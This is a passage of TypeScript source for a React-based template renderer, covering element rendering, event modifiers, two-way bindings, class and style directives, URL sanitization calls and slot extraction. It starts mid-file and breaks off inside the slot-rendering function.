/** Drop unsafe URLs from the props of a registered component. */
function sanitizeComponentUrlProps(props: SoftNProps, tag: string, policy: EgressPolicy): void {
  const blocked: string[] = [];

  const seen: Scrubbed = new Map();
  for (const name of Object.keys(props)) {
    const next = scrubUrlProp(name, props[name], 0, blocked, policy, seen);
    if (next !== props[name]) props[name] = next;
  }

  if (blocked.length > 0 && isDevelopment) {
    console.warn(`[SoftN] Blocked unsafe URL in <${tag}>: ${blocked[0].slice(0, 80)}`);
  }
}

/**
 * Get a unified context for event handlers and callbacks.
 * Cached on the context object to avoid re-creating per element (~100+ elements per render).
 */
const _callbackCtxCache = new WeakMap<SoftNRenderContext, SoftNRenderContext>();
function createCallbackContext(context: SoftNRenderContext): SoftNRenderContext {
  let cached = _callbackCtxCache.get(context);
  if (cached) return cached;
  cached = { ...context, functions: callbackFunctions(context) };
  _callbackCtxCache.set(context, cached);
  return cached;
}

/**
 * The functions a callback may call: the app's, with the state-tracking
 * version of each in place of the plain one. Kept for the pair of tables it
 * was made from. Every row of a loop is drawn in a context of its own, and
 * each of them used to merge the two tables again.
 */
type FunctionTable = SoftNRenderContext['functions'];
const _callbackFunctions = new WeakMap<FunctionTable, { tracked: FunctionTable; merged: FunctionTable }>();
function callbackFunctions(context: SoftNRenderContext): FunctionTable {
  const made = _callbackFunctions.get(context.functions);
  if (made && made.tracked === context.asyncFunctions) return made.merged;
  const merged = { ...context.functions, ...context.asyncFunctions };
  _callbackFunctions.set(context.functions, { tracked: context.asyncFunctions, merged });
  return merged;
}

/**
 * The values of an argument list or an array literal, with every `...list`
 * laid out in place.
 *
 * A list spreads its items; so does anything else that iterates (a string's
 * characters, a Set's members). `null` and `undefined` spread to nothing
 * rather than throwing, because the usual reason a template meets one is
 * data that has not arrived yet; anything else that cannot be iterated is
 * dropped the same way.
 */
function evaluateArguments(
  nodes: Expression[],
  context: SoftNRenderContext,
  locals: SoftNLocalScope | undefined,
  depth: number
): unknown[] {
  const values: unknown[] = [];
  for (const node of nodes) {
    if (node.type !== 'SpreadElement') {
      values.push(evaluate(node, context, locals, depth));
      continue;
    }
    const spread = evaluate(node.argument, context, locals, depth);
    if (Array.isArray(spread)) {
      // Not push(...spread): a long list would overflow the call stack.
      for (const item of spread) values.push(item);
    } else if (
      spread !== null &&
      spread !== undefined &&
      typeof (spread as { [Symbol.iterator]?: unknown })[Symbol.iterator] === 'function'
    ) {
      for (const item of spread as Iterable<unknown>) values.push(item);
    }
  }
  return values;
}

/**
 * Apply an event's modifiers (`@submit.prevent`, `@keydown.enter`,
 * `@click.self`) around its handler.
 *
 * The filters come first: a key the event is not for, a held key that is not
 * down or a target that is not the element itself means the handler does not
 * run and the event is left alone. Then `prevent` and `stop` act on the
 * event, then the handler is called with what it would have been given.
 *
 * A component decides what its callback receives, and some hand over plain
 * data rather than an event. `prevent` and `stop` then have nothing to act
 * on and do nothing; a filter has nothing to test and does not pass.
 */
function withEventModifiers(handler: EventHandler, modifiers: readonly string[]): EventHandler {
  const keys: string[] = [];
  const held: string[] = [];
  for (const modifier of modifiers) {
    if (Object.hasOwn(EVENT_MODIFIERS.key, modifier)) keys.push(...EVENT_MODIFIERS.key[modifier]);
    if (Object.hasOwn(EVENT_MODIFIERS.held, modifier)) held.push(EVENT_MODIFIERS.held[modifier]);
  }
  const self = modifiers.includes('self');
  const prevent = modifiers.includes('prevent');
  const stop = modifiers.includes('stop');

  return (...args: unknown[]) => {
    const first = args[0];
    const event =
      typeof first === 'object' && first !== null ? (first as Record<string, unknown>) : undefined;

    if (keys.length > 0 && !(event && typeof event.key === 'string' && keys.includes(event.key))) {
      return undefined;
    }
    if (held.some((flag) => !(event && event[flag] === true))) return undefined;
    if (self && !(event && event.target !== undefined && event.target === event.currentTarget)) {
      return undefined;
    }

    if (event) {
      if (prevent && typeof event.preventDefault === 'function') {
        (event.preventDefault as () => void).call(event);
      }
      if (stop && typeof event.stopPropagation === 'function') {
        (event.stopPropagation as () => void).call(event);
      }
    }
    return handler(...args);
  };
}

/**
 * Evaluate an expression that decides STRUCTURE — a condition or an iterable —
 * and survive it throwing.
 *
 * The same bad data should not be survivable in one position and fatal in
 * another. `{JSON.parse(raw).n}` in a text node is caught and shown as a small
 * inline marker; in a condition or an iterable it escaped the runtime's error
 * boundary and replaced the whole application with an error screen. Which one
 * you got depended only on where you had written it.
 *
 * Commit 8e9366b set out to fix all four positions and reached one: #if. #each,
 * inline `if=` and inline `each=` still tore the app down, which is how this
 * came back — the message said it was handled everywhere, so nobody looked.
 *
 * An unanswerable condition is false. An iterable that cannot be evaluated is
 * empty, which also means an `#each` renders its `#empty` fallback — the right
 * thing to put on screen when the list could not be worked out.
 */
function evaluateStructural<T>(
  expr: Expression,
  context: SoftNRenderContext,
  fallback: T,
  what: string
): unknown {
  try {
    return evaluateExpression(expr, context);
  } catch (error) {
    if (isDevelopment) {
      console.error(`[SoftN] ${what} threw; using ${JSON.stringify(fallback)}:`, error);
    }
    return fallback;
  }
}

/**
 * The class names a list or a record of conditions stands for: a list's
 * entries that are text, a record's keys whose values hold, either inside
 * the other. Anything else in a list (`false` from `cond && "name"`, `null`)
 * is nothing.
 */
function classText(value: unknown, depth = 0): string {
  if (typeof value === 'string') return value.trim();
  if (typeof value === 'number') return String(value);
  if (value === null || typeof value !== 'object' || depth > 8) return '';
  const names = Array.isArray(value)
    ? value.map((entry) => classText(entry, depth + 1))
    : Object.keys(value as Record<string, unknown>).filter((name) => Boolean((value as Record<string, unknown>)[name]));
  return names.filter(Boolean).join(' ');
}

/**
 * What `:bind` holds on a component whose state is not called `value`.
 *
 * `:bind` gives a control the variable as `value` and writes back what its
 * `onChange` reports. A Modal has neither: it is `open`, and it asks to be
 * shut through `onClose`. Bound the ordinary way it was handed a `value` it
 * does not read and an `onChange` it never calls, so every page that opens
 * a dialog carried a function whose whole body was `showAdd = false`.
 *
 * `prop` is given the variable (as a plain true or false where `flag`);
 * each callback in `writes` writes it, with the callback's own argument or
 * with the value fixed here. By tag name, as the checkable controls are:
 * a component is registered lazily and cannot be asked before it is drawn.
 */
/**
 * The components a `selectTo="path"` is wired for: the chosen row is written
 * to `path` from their `onSelect` (see renderElement). By tag name, as
 * BOUND_STATE is, and only where a component declares the prop.
 */
const SELECT_TO_TAGS: ReadonlySet<string> = new Set(['SmartGrid']);

/**
 * Write `value` at `path` as a page writes state: through the handler a
 * parent gave for it (`on<Root>Change`, or `onUpdate`), not at all where the
 * root is a read-only prop, or into the app's own state.
 */
function writeStateAt(path: string, value: unknown, context: SoftNRenderContext): void {
  const rootVar = path.split('.')[0].split('[')[0]; // Handle array access
  // Look for an external handler first (on[VarName]Change or onUpdate)
  // This allows parent components to manage state externally
  const updateHandler = context.functions[`on${capitalize(rootVar)}Change`] || context.functions['onUpdate'];
  if (typeof updateHandler === 'function') {
    updateHandler(path, value);
  } else if (rootVar in context.props) {
    // Props are read-only and no handler was provided
    if (isDevelopment) {
      console.warn(
        `Cannot update prop "${path}" directly. Props are read-only. ` +
          `Define an on${capitalize(rootVar)}Change or onUpdate handler to propagate changes.`
      );
    }
  } else {
    // It's internal state - update directly
    context.setState(path, value);
  }
}

const BOUND_STATE: Record<string, { prop: string; flag?: boolean; writes: Array<[callback: string, fixed?: unknown]> }> = {
  Modal: { prop: 'open', flag: true, writes: [['onClose', false]] },
  Drawer: { prop: 'open', flag: true, writes: [['onClose', false]] },
  // Either answer ends the question; the answer itself is still `@confirm`.
  Confirm: { prop: 'open', flag: true, writes: [['onCancel', false], ['onConfirm', false]] },
  Popover: { prop: 'open', flag: true, writes: [['onOpenChange']] },
  Tooltip: { prop: 'open', flag: true, writes: [['onOpenChange']] },
  Collapse: { prop: 'isOpen', flag: true, writes: [] },
  Sidebar: { prop: 'collapsed', flag: true, writes: [['onCollapse']] },
  Tabs: { prop: 'activeKey', writes: [['onChange']] },
  Pagination: { prop: 'currentPage', writes: [['onPageChange']] },
  Accordion: { prop: 'openKeys', writes: [['onChange']] },
};

/**
 * Render an element node
 * Supports inline conditionals (if=) and loops (each=/as=)
 */
function renderElement(
  node: ElementNode,
  context: SoftNRenderContext,
  registry: ComponentRegistry,
  key?: number | string,
  inLoopPass = false
): React.ReactNode {
  // Check inline conditional first.
  //
  // Not when the element also loops: such a condition almost always names the
  // loop variable, which is not bound out here, so testing it now answers
  // falsy and drops the whole loop. The per-item recursion below re-enters
  // with the variable bound and keeps `conditionalIf`, which is where an
  // `each` + `if` pair is meant to be resolved.
  if (node.conditionalIf && (inLoopPass || !node.inlineEach)) {
    const condition = evaluateStructural(node.conditionalIf, context, false, 'if= condition');
    if (!condition) {
      return null; // Don't render if condition is falsy
    }
  }

  // Check for inline loop
  if (node.inlineEach && !inLoopPass) {
    const iterable = evaluateStructural(node.inlineEach.iterable, context, [], 'each= iterable');
    const { items, keys } = iterationOf(iterable);

    if (items.length === 0) {
      reportEachCount(node, iterable, 'each=');
      return null; // Don't render if iterable is empty
    }

    const binding = loopBinding(node.inlineEach.itemName, node.inlineEach.indexName);
    const list = writableListPath(node.inlineEach.iterable, context);

    // Render element once per item
    const renderedItems = items.map((item, index) => {
      const iterContext = loopPassContext(context, binding, list, item, index, keys?.[index]);

      // Generate a unique key for each iteration
      const itemKey =
        typeof item === 'object' && item !== null && 'id' in item
          ? String((item as { id: unknown }).id)
          : (keys?.[index] ?? String(index));

      // The same element, drawn for this pass rather than looped again.
      return renderElement(node, iterContext, registry, `${key}-${itemKey}`, true);
    });

    return reusableFragment(node, 'each', key, key, renderedItems);
  }

  // First, check the registry for a custom component
  let Component: SoftNComponent | keyof JSX.IntrinsicElements | undefined = registry.get(node.tag);

  // If not in registry, check if it's a valid HTML element
  if (!Component) {
    if (isHTMLElement(node.tag)) {
      // Use the lowercase HTML tag as the component
      Component = node.tag.toLowerCase() as keyof JSX.IntrinsicElements;
    } else if (svgChildElement(node.tag)) {
      // A shape inside an `<svg>`, by the name SVG gives it. Only `svg` was
      // allowed, so an icon drew "Unknown component" for each of its paths.
      Component = svgChildElement(node.tag) as keyof JSX.IntrinsicElements;
    } else {
      if (isDevelopment) {
        console.warn(
          `Unknown component: ${node.tag}. Not a registered component or valid HTML element.`
        );
      }
      // Return a visible error placeholder in development
      return React.createElement(
        'div',
        {
          key,
          style: {
            padding: '0.5rem',
            margin: '0.25rem',
            background: 'var(--softn-error-bg, #fef2f2)',
            border: '1px solid var(--softn-error-border, #fecaca)',
            borderRadius: '0.25rem',
            color: 'var(--softn-error-text, #b91c1c)',
            fontSize: '0.875rem',
            fontFamily: 'monospace',
          },
        },
        `Unknown component: <${node.tag}>`
      );
    }
  }

  // TypeScript guard: Component is now definitely defined
  const FinalComponent = Component;

  // Build props
  const props: SoftNProps = { key };

  // The unified context for callbacks, made when the element has one.
  let madeCallbackContext: SoftNRenderContext | undefined;
  const callbackContext = (): SoftNRenderContext =>
    (madeCallbackContext ??= createCallbackContext(context));

  // Static and dynamic props
  // `class:active={cond}` adds "active" to the class list when the condition
  // holds, and contributes nothing when it does not. Collected here and merged
  // after the loop so it composes with a plain `class="card"` instead of
  // fighting it for the same prop slot.
  const classToggles: string[] = [];
  // `style:color={accent}` sets one style property and leaves the rest of
  // `style` alone, the way `class:` does for one class. Merged after the
  // bindings below, so it also composes with a `:style` binding.
  let styleDirectives: Record<string, unknown> | null = null;

  for (const prop of node.props) {
    if (prop.name.startsWith('class:')) {
      const cssClass = prop.name.slice('class:'.length);
      let on: unknown;
      if (prop.value.type === 'expression') {
        try {
          on = evaluateExpression(prop.value.value, context);
        } catch (error) {
          if (isDevelopment) {
            console.warn(`Error evaluating class:${cssClass} on <${node.tag}>:`, error);
          }
          on = false;
        }
      } else {
        on = prop.value.value;
      }
      if (on) classToggles.push(cssClass);
      continue;
    }
    if (prop.name.startsWith('style:')) {
      const cssProperty = prop.name.slice('style:'.length);
      let value: unknown;
      if (prop.value.type === 'expression') {
        try {
          value = evaluateExpression(prop.value.value, context);
        } catch (error) {
          if (isDevelopment) {
            console.warn(`Error evaluating style:${cssProperty} on <${node.tag}>:`, error);
          }
          value = undefined;
        }
      } else {
        value = prop.value.value;
      }
      // Nothing to say is nothing set: `style:color={error && "red"}` leaves
      // the colour to the stylesheet when there is no error.
      if (typeof value === 'string' ? value !== '' : typeof value === 'number' && Number.isFinite(value)) {
        if (!styleDirectives) styleDirectives = {};
        styleDirectives[cssPropertyName(cssProperty)] = value;
      }
      continue;
    }
    if (prop.value.type === 'static' || prop.value.type === 'number' || prop.value.type === 'boolean') {
      props[prop.name] = prop.value.value;
    } else {
      try {
        // Use callbackContext for props that look like callbacks (on*) to ensure
        // state changes from these handlers trigger re-renders
        const isCallback = isCallbackProp(prop.name);
        const evalContext = isCallback ? callbackContext() : context;

        // `onClick={doThing()}` names the call to make on click, not a value to
        // compute now — the same reading `@click={doThing()}` already gets from
        // the events loop below. Evaluating it here ran the handler on every
        // render and then passed its return value as the callback.
        // An assignment or `++` is the same: `onClose={open = false}` says
        // what to do when it closes, as `@close={open = false}` does.
        const deferred = prop.value.value.type;
        if (
          isCallback &&
          (deferred === 'CallExpression' || deferred === 'AssignmentExpression' || deferred === 'UpdateExpression')
        ) {
          const callExpr = prop.value.value;
          props[prop.name] = () => evaluateExpression(callExpr, evalContext);
          continue;
        }

        const evaluated = evaluateExpression(prop.value.value, evalContext);

        props[prop.name] = evaluated;
      } catch (error) {
        if (isDevelopment) {
          console.warn(`Error evaluating prop "${prop.name}" on <${node.tag}>:`, error);
        }
        props[prop.name] = undefined;
      }
    }
  }

  // A class written as a list or a record of conditions is the text it
  // stands for. React writes a list joined by commas and a record as
  // "[object Object]", and the element had none of its classes.
  for (const key of ['className', 'class'] as const) {
    const given = props[key];
    if (given !== null && typeof given === 'object') {
      const text = classText(given);
      if (text) props[key] = text;
      else delete props[key];
    }
  }

  // `class` is `className`: the word HTML teaches, under the name React has
  // for it.
  //
  // On a component, because a component reads only the second: `<Heading
  // class="title">` was drawn with no class and the rule written for it never
  // applied, with nothing to say so. On a plain tag, because React writes
  // the attribute for either word but a development build reports the first
  // — "Invalid DOM property `class`. Did you mean `className`?" — once for
  // every kind of element that carries it, about markup written the way the
  // documentation writes it. A `className` written beside it is kept, and
  // the two are one list.
  //
  // A custom element (a tag with a hyphen) is left as it is written: React
  // hands such an element its attributes by the names they are given.
  const customElement = typeof FinalComponent === 'string' && FinalComponent.includes('-');
  const svgElement =
    typeof FinalComponent === 'string' &&
    (FinalComponent === 'svg' || svgChildElement(FinalComponent) !== undefined);
  if (!customElement && 'class' in props) {
    // What was drawn for a plain tag still is: a number was written as text.
    const plainTag = typeof FinalComponent === 'string';
    const written = [props.className, props.class]
      .map((value) => (plainTag && typeof value === 'number' ? String(value) : value))
      .filter((value) => typeof value === 'string' && value !== '');
    if (written.length > 0) props.className = written.join(' ');
    delete props.class;
  }

  if (classToggles.length > 0) {
    // Added to what was written. Only a custom element still has two words
    // for it, and there the one its author used is the one written back.
    const key = customElement && typeof props.className !== 'string' ? 'class' : 'className';
    const base = typeof props[key] === 'string' ? (props[key] as string) : '';
    props[key] = [base, ...classToggles].filter(Boolean).join(' ');
  }

  // `for`, `readonly`, `tabindex`: HTML's names, as React knows them.
  if (typeof FinalComponent === 'string' && !customElement && !svgElement) {
    renameToReactAttributes(props);
  }

  // Bindings
  for (const binding of node.bindings) {
    let value: unknown;
    try {
      value = evaluateExpression(binding.expression, context);
    } catch (error) {
      if (isDevelopment) {
        console.warn(`Error evaluating binding ":${binding.name}" on <${node.tag}>:`, error);
      }
      value = undefined;
    }

    // A checkbox-shaped control carries its state in `checked`, not `value` —
    // its `value` is the constant "on". Binding `value` left `checked`
    // undefined, so the control ran uncontrolled and never reflected the bound
    // variable, while the change wrote the string "on" back over it.
    // One radio: a plain `<input type="radio">`, or a host's own Radio
    // that is one option with a `value`. The built-in Radio is a group: it
    // takes `options` and the chosen `value`, and hands its callback the new
    // one, like any other control that holds a value. Wired as one radio it
    // was told `checked` and never the value, so the chosen option was not
    // shown, and choosing one wrote the group's own `value` prop, which it
    // does not have: `undefined`, over the answer.
    const isRadio =
      props.type === 'radio' ||
      (node.tag === 'Radio' && props.options === undefined && props.value !== undefined);
    const isCheckable =
      node.tag === 'Checkbox' ||
      node.tag === 'Switch' ||
      props.type === 'checkbox' ||
      isRadio;

    const held = binding.name === 'bind' ? BOUND_STATE[node.tag] : undefined;

    // Write the bound variable: the row it is on inside a loop, through the
    // handler a parent gave for it, or the app's own state.
    const writeBound = (newValue: unknown): void => {
      const path = getExpressionPath(binding.expression, context);
      if (!path) {
        reportUnplacedWrite(binding.expression, context.locals);
        return;
      }
      writeStateAt(path, newValue, context);
    };

    // A callback the binding installs runs before one the page gave under
    // the same name as a prop, so the page's sees the variable written.
    const installBound = (name: string, write: (...args: unknown[]) => void): void => {
      const given = props[name];
      props[name] =
        typeof given === 'function'
          ? (...args: unknown[]) => {
              write(...args);
              return (given as (...a: unknown[]) => unknown)(...args);
            }
          : write;
    };

    if (held) {
      // A component whose state is not called `value`: see BOUND_STATE.
      props[held.prop] = held.flag ? value === true : value;
      for (const [callback, fixed] of held.writes) {
        installBound(callback, (argument: unknown) => writeBound(fixed === undefined ? argument : fixed));
      }
    } else if (binding.name === 'bind') {
      // Two-way binding shorthand
      // Default to "" when value is undefined/null to keep the input controlled
      // from the first render (avoids React "uncontrolled to controlled" warning)
      if (isRadio) {
        // A radio is checkable but not boolean. It is checked when the bound
        // variable equals THIS radio's value, and choosing it should write that
        // value. Treated as a checkbox it was `value === true` — never true for
        // a real choice — so every radio in the group rendered unchecked, and
        // clicking one wrote `true` over the selection, destroying the answer it
        // was meant to record.
        props.checked = value !== undefined && value !== null && String(value) === String(props.value);
      } else if (isCheckable) {
        props.checked = value === true;
      } else {
        props.value = value ?? '';
      }
      // Handle both native elements (pass event) and custom components (pass value directly)
      installBound('onChange', (eventOrValue: unknown) => {
        // Determine the new value:
        // - If it's an event object with target.value (native elements), use that
        // - Otherwise, treat the argument as the value directly (custom components like Select)
        let newValue: unknown;
        if (isRadio) {
          // The chosen option, not a boolean. A radio's `value` is the answer.
          newValue = props.value;
        } else if (isCheckable) {
          // Read `checked`, and as a boolean: `target.value` on a checkbox is
          // the constant "on", which would make the bound variable a string
          // that never compares false again.
          const target = eventTarget(eventOrValue);
          newValue = target ? Boolean(target.checked) : Boolean(eventOrValue);
        } else {
          // A native event's value, or the value a custom component such
          // as Select passed directly; a number field's as a number.
          newValue = boundValue(eventOrValue);
        }
        writeBound(newValue);
      });
    } else {
      props[binding.name] = value;
    }
  }

  // `<SmartGrid selectTo="picked" />`: keep the row the person chooses in
  // `picked`. The grid took the prop and did nothing with it, because a
  // component cannot write app state; the renderer can. It is taken off the
  // props, and the grid's `onSelect` writes the row first, by the rules
  // `:bind` writes by, then calls what the page gave, so an `@select` sees
  // the row written.
  if (SELECT_TO_TAGS.has(node.tag) && typeof props.selectTo === 'string' && props.selectTo !== '') {
    const path = props.selectTo;
    delete props.selectTo;
    const given = props.onSelect;
    props.onSelect = (row: unknown, ...rest: unknown[]) => {
      writeStateAt(path, row, context);
      return typeof given === 'function' ? (given as (...a: unknown[]) => unknown)(row, ...rest) : undefined;
    };
  }

  // Event handlers - use unified callback context
  // For change/input events, auto-extract target.value so VM functions
  // receive the string value instead of a React SyntheticEvent object.
  const wrapEventHandler = (name: string, fn: EventHandler, givenEvent = false) => {
    if ((name === 'change' || name === 'input') && !givenEvent) {
      return (e: unknown) => fn(changedValue(e));
    }
    // Everything else gets its arguments forwarded.
    //
    // These are not all DOM events: a component decides what it hands its own
    // callback, and several pass plain data — DPad gives `@press` the direction
    // pressed, and dropping it left every on-screen control doing nothing while
    // the keyboard path still worked. Where the argument really is a DOM event,
    // neither kind of handler holds it: the VM adapter reduces it to a plain
    // record before it can reach a script (see `sanitizeArgs`), and an arrow
    // written in the template is given that record with `preventDefault()`
    // and the element's own values added (see `markupValue`).
    return (...args: unknown[]) => fn(...args);
  };

  for (const event of node.events) {
    // What :bind already installed for this event, if anything.
    //
    // `<input :bind={q} @change={note()} />` used to lose its binding entirely:
    // the bindings loop sets onChange to write state back, and this loop then
    // assigned over it. The field stopped updating — every keystroke was
    // discarded and the input sat frozen on its initial value — while the
    // handler the author added ran perfectly, so nothing looked broken except
    // the typing. Both are wanted; both run, binding first so the handler sees
    // the new value.
    const boundHandlerName = reactEventProp(event.name);
    const boundHandler = props[boundHandlerName];

    // If the handler is a function call (e.g., @click={handleClick()}),
    // we need to wrap it in a closure to prevent immediate execution during render.
    // If it's a function reference or arrow function, evaluate it directly.
    const handlerExpr = event.handler;
    const handlerContext = callbackContext();

    if (handlerExpr.type === 'CallExpression') {
      // Wrap in closure - execute the call when the event fires
      props[reactEventProp(event.name)] = wrapEventHandler(event.name, () => {
        return evaluateExpression(handlerExpr, handlerContext);
      });
    } else if (handlerExpr.type === 'ArrowFunctionExpression') {
      // Arrow functions are already deferred - evaluate to get the function
      const handler = evaluateExpression(handlerExpr, handlerContext);
      props[reactEventProp(event.name)] =
        typeof handler === 'function'
          ? wrapEventHandler(event.name, handler as EventHandler, event.quoted === true)
          : handler;
    } else if (handlerExpr.type === 'Identifier' || handlerExpr.type === 'MemberExpression') {
      // Function reference - evaluate to get the function, wrap to ensure it's callable
      const handler = evaluateExpression(handlerExpr, handlerContext);
      if (typeof handler === 'function') {
        props[reactEventProp(event.name)] = wrapEventHandler(event.name, handler as EventHandler);
      } else {
        // If not a function, wrap in a no-op to prevent errors.
        // Only warn if the script has finished loading — before that, functions
        // aren't available yet and this is expected.
        if (isDevelopment && context.scriptLoaded) {
          console.warn(`Event handler for ${event.name} is not a function:`, handler);
        }
        props[reactEventProp(event.name)] = () => {};
      }
    } else {
      // Other expression types - wrap in closure for safety
      props[reactEventProp(event.name)] = wrapEventHandler(event.name, () => {
        return evaluateExpression(handlerExpr, handlerContext);
      });
    }

    // `@submit.prevent`, `@keydown.enter`: outside the value-extracting
    // wrapper above, because the modifiers read the event itself. Whatever
    // :bind installed is folded in after this and so is never filtered.
    if (event.modifiers && event.modifiers.length > 0 && typeof props[boundHandlerName] === 'function') {
      props[boundHandlerName] = withEventModifiers(
        props[boundHandlerName] as EventHandler,
        event.modifiers
      );
    }

    const authored = props[boundHandlerName];
    if (typeof boundHandler === 'function' && authored !== boundHandler) {
      props[boundHandlerName] = (...args: unknown[]) => {
        (boundHandler as (...a: unknown[]) => unknown)(...args);
        if (typeof authored === 'function') {
          return (authored as (...a: unknown[]) => unknown)(...args);
        }
        return undefined;
      };
    }
  }

  if (typeof FinalComponent === 'string') {
    keepFieldEditable(FinalComponent, node, props);
  }

  if (styleDirectives) {
    const base =
      typeof props.style === 'string'
        ? inlineStyleObject(props.style)
        : isPlainObject(props.style)
          ? props.style
          : {};
    props.style = { ...base, ...styleDirectives };
  }

  // Extract slot content from children (template slots and default content)
  const { slotContent, defaultChildren } = slotContentOf(node.children);

  // Create context with slots for child components
  const childContext: SoftNRenderContext = slotContent
    ? { ...context, slots: slotContent }
    : context;

  // A textarea's content is the text it starts with, not children.
  let contentNodes = defaultChildren;
  if (FinalComponent === 'textarea' && defaultChildren.length > 0) {
    const text = textareaText(defaultChildren, (child) =>
      evaluateStructural(child.expression, context, '', 'textarea text')
    );
    if (text !== undefined) {
      if (!('value' in props) && !('defaultValue' in props)) props.defaultValue = text;
      contentNodes = [];
    }
  }

  // Render non-slot children with parent key for stable keys
  const children = renderNodes(contentNodes, childContext, registry, String(key));

  // A string tag means these props go straight to the DOM, so every name HTML
  // treats as a URL can be judged by name. A registered component gets the
  // narrower, unambiguous set instead, applied through the whole prop value
  // rather than only its top level.
  const egressPolicy = egressPolicyFor(context);
  if (typeof FinalComponent === 'string') {
    // `src="images/logo.png"`: the bundle's file, before the URL check.
    showBundleFiles(node, props, context.functions?.asset);
    sanitizeUrlProps(props, node.tag, egressPolicy);
    if (svgElement) sanitizeSvgReferences(props, node.tag, egressPolicy);
    // After the URL check, which drops an action it refuses, and a link
    // it refuses.
    if (FinalComponent === 'form') keepFormOnPage(props);
    if (FinalComponent === 'a') followPageLinks(props, context.followLink);
    dropCodeAttributes(props);
    dropTopLayerProps(props);
    dropDocumentName(props, FinalComponent);
  } else {
    sanitizeComponentUrlProps(props, node.tag, egressPolicy);
  }
  dropRawMarkupProp(props);
  // CSS text becomes an object first, so it is checked the way an object is
  // (see inline-style.ts for why a string reached React at all).
  if (typeof props.style === 'string') props.style = inlineStyleObject(props.style);
  // Applies to both: a registered component that spreads `style` onto its root
  // element reaches the network by exactly the same route a raw <div> does.
  withholdRemoteStyleUrls(props, egressPolicy);

  // A tag with nothing inside it has no children, as in JSX. It was given
  // the empty list `renderNodes` returns, and a component that asks whether
  // it was given children took that for a yes: `<Avatar name="Ada" />` drew
  // its absent children where its initials belong.
  //
  // A void element takes none whatever is written, and React throws rather
  // than ignoring the argument, even for that empty list. `img`, `br`, `hr`,
  // `input` and `source` are all on the allowlist above, so every one of
  // them crashed the render of any `.ui` that used the plain HTML tag. The
  // demos only reach them through wrapper components like `<Image>`, which
  // is why it went unnoticed.
  //
  // The same goes for a tag whose contents all come to nothing: an `#if`
  // that does not hold, an `#each` with nothing to go through. A list of
  // nothings is as much a yes to "was I given children?" as an empty one.
  const isVoid = typeof FinalComponent === 'string' && VOID_ELEMENTS.has(node.tag.toLowerCase());
  const childless = isVoid || (children as React.ReactNode[]).every(isNothingDrawn);

  // With everything this element would be made from in hand, see whether it
  // is what this place was made from last time; see reuse.ts.
  const active = typeof key === 'string' ? pass : null;
  const before = active ? recall(active, key as string, node, 'element') : undefined;
  const settled = active ? settleProps(props, before) : undefined;
  const drawn = childless ? NO_CHILDREN : (children as React.ReactNode[]);
  if (
    active &&
    settled &&
    before &&
    before.component === FinalComponent &&
    !before.failure?.caught &&
    before.props &&
    sameProps(before.props, props, settled.styleUnchanged) &&
    sameNodes(before.children, drawn)
  ) {
    keep(active, key as string, before);
    return before.result;
  }

  // An `<option>`'s words as one text, which React reads its value from: as
  // a list they drew the same, with a warning that the value could not be
  // read from them.
  const optionText = FinalComponent === 'option' && !childless ? textOf(children as React.ReactNode[]) : undefined;
  const element = childless
    ? React.createElement(FinalComponent, props)
    : React.createElement(FinalComponent, props, optionText ?? children);

  // Wrap registered (non-HTML) components in a per-component error boundary
  // so a single component crash doesn't take down the entire document
  const failure = active && typeof FinalComponent !== 'string' ? { caught: false } : undefined;
  const result =
    typeof FinalComponent !== 'string'
      ? React.createElement(ComponentErrorBoundary, { key, tag: node.tag, failure }, element)
      : element;

  if (active && settled) {
    keep(active, key as string, {
      node,
      kind: 'element',
      result,
      component: FinalComponent,
      props,
      children: drawn,
      handlers: settled.handlers,
      style: settled.style,
      failure,
    });
  }
  return result;
}

const NO_CHILDREN: readonly React.ReactNode[] = [];

/**
 * Drawn children as the one text they make, when they are only words and
 * values (each drawn in a fragment of its own), or undefined.
 */
function textOf(children: readonly React.ReactNode[]): string | undefined {
  let text = '';
  for (const child of children) {
    if (isNothingDrawn(child)) continue;
    if (typeof child === 'string' || typeof child === 'number') {
      text += child;
      continue;
    }
    if (React.isValidElement(child) && child.type === React.Fragment) {
      const inner = (child.props as { children?: unknown }).children;
      if (typeof inner === 'string' || typeof inner === 'number') {
        text += inner;
        continue;
      }
      if (inner === null || inner === undefined || inner === false) continue;
    }
    return undefined;
  }
  return text;
}

/** What a condition that does not hold, or a list with nothing in it, draws. */
function isNothingDrawn(child: React.ReactNode): boolean {
  return child === null || child === undefined || child === false;
}

/**
 * Extract slot content from children
 * Returns slot content mapping and remaining default children
 *
 * The logic is:
 * - TemplateSlot nodes are extracted into slotContent by their name
 * - Non-slot children are kept as defaultChildren and rendered normally
 * - If there are no template slots, children are rendered normally (no slot extraction)
 */
type ExtractedSlots = {
  slotContent: Record<string, TemplateNode[]> | null;
  defaultChildren: TemplateNode[];
};

/**
 * `extractSlotContent` for a node's children, worked out once. It depends on
 * the parsed children alone, which nothing changes after parsing, and it was
 * done again for every element on every drawing: two lists and a record made
 * to find, nearly always, that there were no slots.
 */
const extractedSlots = new WeakMap<TemplateNode[], ExtractedSlots>();
function slotContentOf(children: TemplateNode[]): ExtractedSlots {
  let extracted = extractedSlots.get(children);
  if (!extracted) {
    extracted = extractSlotContent(children);
    extractedSlots.set(children, extracted);
  }
  return extracted;
}

function extractSlotContent(children: TemplateNode[]): ExtractedSlots {
  const slotContent: Record<string, TemplateNode[]> = {};
  const defaultChildren: TemplateNode[] = [];
  let hasTemplateSlots = false;

  for (const child of children) {
    if (child.type === 'TemplateSlot') {
      // This is an explicit <template slot="name">...</template> block
      hasTemplateSlots = true;
      const slotNode = child as TemplateSlotNode;
      const name = slotNode.name || 'default';
      if (!slotContent[name]) {
        slotContent[name] = [];
      }
      slotContent[name].push(...slotNode.children);
    } else {
      // Regular child - render normally
      defaultChildren.push(child);
    }
  }

  // If we have template slots, also add non-slot children to default slot
  // This allows mixing explicit slots with default content
  if (hasTemplateSlots && defaultChildren.length > 0) {
    if (!slotContent['default']) {
      slotContent['default'] = [];
    }
    slotContent['default'].push(...defaultChildren);
  }

  // Return slots only if we found template slots
  // Otherwise just render children normally
  return {
    slotContent: hasTemplateSlots ? slotContent : null,
    defaultChildren: hasTemplateSlots ? [] : defaultChildren,
  };
}

/**
 * Render a slot node
 */
function renderSlot(
  node: SlotNode,
  context: SoftNRenderContext,
  registry: ComponentRegistry,
  key?: number | string
): React.ReactNode {
  const slotName = node.name || 'default';

  // Check if we have content for this slot from parent
  if (context.slots && context.slots[slotName]) {
    const slotChildren = context.slots[slotName];
    return reusableFragment(
      node,
      'slot',
      key,
      key,
      renderNodes(slotChildren, context, registry, `${key ?? ''}-slot-${slotName}`)
    );
  }

  // Use fallback content if provided
